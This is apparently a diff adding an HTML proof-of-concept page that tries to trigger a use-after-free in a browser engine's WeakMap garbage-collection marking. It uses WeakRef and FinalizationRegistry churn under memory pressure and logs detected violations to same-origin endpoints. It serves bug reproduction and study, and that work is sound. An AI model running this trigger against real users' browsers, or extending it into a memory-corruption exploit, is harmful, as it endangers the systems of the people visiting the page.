@@ -1,0 +1,299 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Deferred WeakMap marking UAF reproducer</title>
+<pre id="status">starting</pre>
+<script>
+"use strict";
+
+(() => {
+  const statusNode = document.getElementById("status");
+  const MiB = 1024 * 1024;
+
+  const state = {
+    nextId: 1,
+    round: 0,
+    strong: [],
+    active: [],
+    byId: new Map(),
+    pressureBuffers: [],
+    pressureGraphs: [],
+    finalizedExpected: 0,
+    finalizedLive: 0,
+    touches: 0,
+    checksum: 0,
+  };
+
+  function report(message) {
+    const text = `[${new Date().toISOString()}] ${message}`;
+    console.log(text);
+    statusNode.textContent = text + "\n" + statusNode.textContent.slice(0, 12000);
+    fetch(`/log?m=${encodeURIComponent(text)}`, {
+      cache: "no-store",
+      credentials: "omit",
+      keepalive: true,
+    }).catch(() => {});
+  }
+
+  window.addEventListener("error", event => {
+    report(`window-error ${event.message} ${event.filename}:${event.lineno}`);
+  });
+  window.addEventListener("unhandledrejection", event => {
+    report(`unhandled-rejection ${String(event.reason)}`);
+  });
+
+  function nextTask(delay = 0) {
+    return new Promise(resolve => setTimeout(resolve, delay));
+  }
+
+  function makeValue(id) {
+    const value = new Uint8Array(32 * 1024);
+    for (let i = 0; i < 256; i++) {
+      value[i] = (id * 17 + i * 29) & 0xff;
+    }
+    value.ctfId = id;
+    value.ctfTag = `weakmap-value-${id}`;
+    return value;
+  }
+
+  function makeKey(id) {
+    return {
+      id,
+      tag: `weakmap-key-${id}`,
+      pad: [id ^ 0x55aa55aa, id + 1, id + 2, id + 3],
+    };
+  }
+
+  function touchCandidate(candidate, why, aggressive) {
+    state.touches++;
+
+    try {
+      const value = candidate.map.get(candidate.key);
+      if (value === undefined) {
+        report(`touch-missing id=${candidate.id} kind=${candidate.kind} why=${why}`);
+        return false;
+      }
+
+      const length = value.length;
+      const byteLength = value.byteLength;
+      let checksum = 0;
+      for (let i = 0; i < Math.min(length, 256); i++) {
+        checksum = (checksum + value[i]) | 0;
+      }
+      state.checksum = (state.checksum + checksum + length + byteLength) | 0;
+      value[0] ^= 0xff;
+      value[1] = (value[1] + 1) & 0xff;
+
+      if (aggressive) {
+        value.fill(0x5a, 2, Math.min(length, 1024));
+        const copy = value.slice(0, Math.min(length, 2048));
+        const clone = structuredClone(value);
+        report(`touch-aggressive-ok id=${candidate.id} why=${why} copy=${copy.length} clone=${clone.length}`);
+      }
+      return true;
+    } catch (error) {
+      report(`touch-js-exception id=${candidate.id} kind=${candidate.kind} why=${why} error=${error && error.stack || error}`);
+      return false;
+    }
+  }
+
+  const registry = new FinalizationRegistry(id => {
+    const candidate = state.byId.get(id);
+    if (!candidate || !candidate.expectedLive || !candidate.map) {
+      state.finalizedExpected++;
+      if ((state.finalizedExpected % 250) === 0) {
+        report(`expected-finalizers=${state.finalizedExpected}`);
+      }
+      return;
+    }
+
+    state.finalizedLive++;
+    report(`FINALIZATION-REGISTRY-LIVE-VALUE id=${id} kind=${candidate.kind} violations=${state.finalizedLive}`);
+
+    touchCandidate(candidate, "finalization-callback", true);
+  });
+
+  function makeStrongCandidate() {
+    const id = state.nextId++;
+    const key = makeKey(id);
+    const map = new WeakMap();
+    let value = makeValue(id);
+    map.set(key, value);
+    registry.register(value, id);
+
+    const candidate = {
+      id,
+      key,
+      map,
+      ref: null,
+      expectedLive: true,
+      kind: "strong-mark-boundary",
+    };
+    state.byId.set(id, candidate);
+    state.strong.push(candidate);
+    value = null;
+  }
+
+  function makeWeakBatch(count) {
+    const batch = new Array(count);
+    for (let i = 0; i < count; i++) {
+      const id = state.nextId++;
+      const key = makeKey(id);
+      let map = new WeakMap();
+      let value = makeValue(id);
+      map.set(key, value);
+      registry.register(value, id);
+
+      const candidate = {
+        id,
+        key,
+        map: null,
+        ref: new WeakRef(map),
+        expectedLive: false,
+        kind: "weakref-read-barrier",
+      };
+      state.byId.set(id, candidate);
+      batch[i] = candidate;
+      map = null;
+      value = null;
+    }
+    return batch;
+  }
+
+  function activate(candidate) {
+    const map = candidate.ref.deref();
+    if (map === undefined) {
+      state.byId.delete(candidate.id);
+      return false;
+    }
+
+    candidate.map = map;
+    candidate.expectedLive = true;
+    state.active.push(candidate);
+    return true;
+  }
+
+  function trimActiveWindow(limit) {
+    while (state.active.length > limit) {
+      const candidate = state.active.shift();
+      candidate.expectedLive = false;
+      candidate.map = null;
+      candidate.key = null;
+      candidate.ref = null;
+      state.byId.delete(candidate.id);
+    }
+  }
+
+  function allocatePressure(round) {
+    for (let i = 0; i < 8; i++) {
+      const buffer = new Uint8Array(MiB);
+      for (let page = 0; page < buffer.length; page += 4096) {
+        buffer[page] = (round + i + page) & 0xff;
+      }
+      state.pressureBuffers.push(buffer);
+    }
+
+    const graph = new Array(1800);
+    for (let i = 0; i < graph.length; i++) {
+      graph[i] = {
+        round,
+        i,
+        left: {x: i ^ round, s: `left-${round}-${i}`},
+        right: [i, i + 1, i + 2, {z: i * 3}],
+      };
+    }
+    state.pressureGraphs.push(graph);
+
+    while (state.pressureBuffers.length > 96) {
+      state.pressureBuffers.shift();
+    }
+    while (state.pressureGraphs.length > 16) {
+      state.pressureGraphs.shift();
+    }
+
+    if ((round & 31) === 31) {
+      state.pressureBuffers.splice(0, 32);
+      state.pressureGraphs.splice(0, 6);
+    }
+  }
+
+  async function main() {
+    report("ordinary-web-js-reproducer start; no shell, gczeal, selectforgc, enqueueMark, or fuzzing APIs");
+    report(`ua=${navigator.userAgent}`);
+
+    for (let i = 0; i < 1800; i++) {
+      makeStrongCandidate();
+    }
+    report(`strong-pool=${state.strong.length}`);
+
+    const params = new URL(location).searchParams;
+    const rounds = +(params.get('rounds') || 520);
+    let activated = 0;
+    let missed = 0;
+
+    for (let round = 0; round < rounds; round++) {
+      state.round = round;
+      const batch = makeWeakBatch(72);
+      await nextTask();
+
+      allocatePressure(round);
+      for (let i = 0; i < 36; i++) {
+        activate(batch[i]) ? activated++ : missed++;
+      }
+
+      await nextTask();
+
+      for (let i = 36; i < batch.length; i++) {
+        activate(batch[i]) ? activated++ : missed++;
+      }
+
+      await nextTask();
+      trimActiveWindow(2048);
+
+      if ((round % 20) === 0) {
+        report(`round=${round}/${rounds} active=${state.active.length} activated=${activated} missed=${missed} live-finalizers=${state.finalizedLive}`);
+      }
+    }
+
+    report(`pressure-complete active=${state.active.length} activated=${activated} missed=${missed}`);
+
+    state.pressureBuffers.splice(0, Math.max(0, state.pressureBuffers.length - 8));
+    state.pressureGraphs.length = 0;
+
+    const settleRounds = +(params.get('settle') || 100);
+    for (let i = 0; i < settleRounds; i++) {
+      const reclaim = new Array(600);
+      for (let j = 0; j < reclaim.length; j++) {
+        reclaim[j] = new Uint8Array(32 * 1024);
+        reclaim[j][0] = (i + j) & 0xff;
+      }
+      await nextTask();
+      if ((i % 20) === 0) {
+        report(`settle=${i}/${settleRounds} live-finalizers=${state.finalizedLive}`);
+      }
+    }
+
+    await nextTask(3000);
+
+    report(`final-touch active=${state.active.length} strong=${state.strong.length}`);
+    for (const candidate of state.active) {
+      touchCandidate(candidate, "post-settle-active", false);
+    }
+    for (const candidate of state.strong) {
+      touchCandidate(candidate, "post-settle-strong", false);
+    }
+
+    const completion = `complete live-finalizers=${state.finalizedLive} expected-finalizers=${state.finalizedExpected} touches=${state.touches} checksum=${state.checksum}`;
+    report(completion);
+    fetch(`/done?m=${encodeURIComponent(completion)}`, {
+      cache: "no-store",
+      credentials: "omit",
+      keepalive: true,
+    }).catch(() => {});
+  }
+
+  main().catch(error => {
+    report(`fatal-js-error ${error && error.stack || error}`);
+    throw error;
+  });
+})();
+</script>
